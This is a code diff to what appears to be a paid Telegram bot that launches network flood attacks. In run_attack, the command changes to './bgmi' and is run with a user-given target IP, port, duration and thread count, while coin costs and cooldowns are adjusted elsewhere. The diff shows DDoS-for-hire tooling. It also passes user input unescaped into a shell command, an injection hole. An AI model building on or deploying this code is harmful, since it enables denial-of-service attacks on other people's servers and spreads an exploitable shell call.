@@ -18,7 +18,7 @@ COLLECTION_NAME = "users"
 attack_in_progress = False
 ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
-ATTACK_COOLDOWN = 5  # Cooldown period in seconds (5 minutes)
+ATTACK_COOLDOWN = 10 # Cooldown period in seconds (5 minutes)
 
 # Global variables for packet size and threads
 packet_size = 9
@@ -196,7 +196,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./new {ip} {port} {duration} {packet_size} {threads}"
+        command = f"./bgmi {ip} {port} {duration} {threads}"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
